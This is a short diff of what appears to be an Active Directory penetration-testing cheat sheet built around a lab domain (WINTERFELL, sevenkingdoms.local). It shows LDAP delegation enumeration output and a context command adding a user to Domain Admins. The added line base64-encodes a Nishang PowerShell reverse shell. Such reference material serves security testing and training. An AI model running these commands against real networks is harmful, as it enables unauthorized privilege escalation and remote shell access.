@@ -341,6 +341,7 @@ LDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Resource-Base
 LDAP   192.168.56.11   389   WINTERFELL   CASTELBLACK$ Computer    Constrained                        HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local
 LDAP   192.168.56.11   389   WINTERFELL   пользователь Person      Resource-Based Constrained         WINTERFELL$
 
+cat shell.ps1 | iconv -t utf-16le |base64 -w0	 # powershell nishang shell
 powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"	# Custom command to add a user to the domain admin group for easy copy&pasting
 
 # ZERO LOGON
